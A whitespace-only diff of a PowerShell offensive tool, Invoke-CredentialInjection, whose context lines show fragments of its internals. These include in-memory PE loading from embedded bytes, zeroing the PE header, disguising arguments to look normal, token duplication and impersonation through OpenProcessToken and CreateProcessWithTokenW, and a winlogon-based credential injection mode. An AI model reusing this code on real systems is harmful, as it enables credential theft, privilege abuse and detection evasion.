@@ -2903,7 +2903,7 @@ function Invoke-CredentialInjection
 				    Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
 			    }
 		    }
-		
+
 		    Write-Verbose "Done!"
 	    }
 
@@ -2917,11 +2917,11 @@ function Invoke-CredentialInjection
 	    {
 		    $DebugPreference  = "Continue"
 	    }
-	
+
 	    Write-Verbose "PowerShell ProcessID: $PID"
-	
+
 	    [Byte[]]$PEBytes = $null
-	
+
         if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
         {
             $PEBytes = $Bytes64
@@ -2930,7 +2930,7 @@ function Invoke-CredentialInjection
         {
             $PEBytes = $Bytes32
         }
-	
+
 	    #Verify the image is a valid PE file
 	    $e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''
 
@@ -2943,7 +2943,7 @@ function Invoke-CredentialInjection
 	    # TODO: Investigate how much of the header can be destroyed, I'd imagine most of it can be.
         $PEBytes[0] = 0
         $PEBytes[1] = 0
-	
+
 	    #Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
 	    if ($ExeArgs -ne $null -and $ExeArgs -ne '')
 	    {
@@ -2975,11 +2975,11 @@ function Invoke-CredentialInjection
 	    Param
 	    (
 	        [OutputType([Type])]
-	        
+
 	        [Parameter( Position = 0)]
 	        [Type[]]
 	        $Parameters = (New-Object Type[](0)),
-	        
+
 	        [Parameter( Position = 1 )]
 	        [Type]
 	        $ReturnType = [Void]
@@ -2994,7 +2994,7 @@ function Invoke-CredentialInjection
 	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
 	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
 	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
-	    
+
 	    Write-Output $TypeBuilder.CreateType()
 	}
 
@@ -3005,11 +3005,11 @@ function Invoke-CredentialInjection
 	    Param
 	    (
 	        [OutputType([IntPtr])]
-	    
+
 	        [Parameter( Position = 0, Mandatory = $True )]
 	        [String]
 	        $Module,
-	        
+
 	        [Parameter( Position = 1, Mandatory = $True )]
 	        [String]
 	        $Procedure
@@ -3131,7 +3131,7 @@ function Invoke-CredentialInjection
 
     $OpenProcessTokenAddr = Get-ProcAddress advapi32.dll OpenProcessToken
 	$OpenProcessTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
-	$OpenProcessToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessTokenAddr, $OpenProcessTokenDelegate)    
+	$OpenProcessToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessTokenAddr, $OpenProcessTokenDelegate)
 
     $CreateProcessWithTokenWAddr = Get-ProcAddress advapi32.dll CreateProcessWithTokenW
 	$CreateProcessWithTokenWDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
@@ -3180,7 +3180,7 @@ function Invoke-CredentialInjection
         }
         else
         {
-            $TokenPrivs = $Win32Constants.TOKEN_ASSIGN_PRIMARY -bor $Win32Constants.TOKEN_DUPLICATE -bor $Win32Constants.TOKEN_IMPERSONATE -bor $Win32Constants.TOKEN_QUERY 
+            $TokenPrivs = $Win32Constants.TOKEN_ASSIGN_PRIMARY -bor $Win32Constants.TOKEN_DUPLICATE -bor $Win32Constants.TOKEN_IMPERSONATE -bor $Win32Constants.TOKEN_QUERY
         }
 
         $ReturnStruct = New-Object PSObject
@@ -3330,10 +3330,10 @@ function Invoke-CredentialInjection
 
         return $Pipe
     }
-    
+
     if([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') {
         Write-Error "Script must be run in STA mode, relaunch powershell.exe with -STA flag" -ErrorAction Stop
-    }    
+    }
 
     #Determine the parameterset being used to figure out if a new winlogon process needs to be created or not
     if ($PsCmdlet.ParameterSetName -ieq "NewWinLogon")
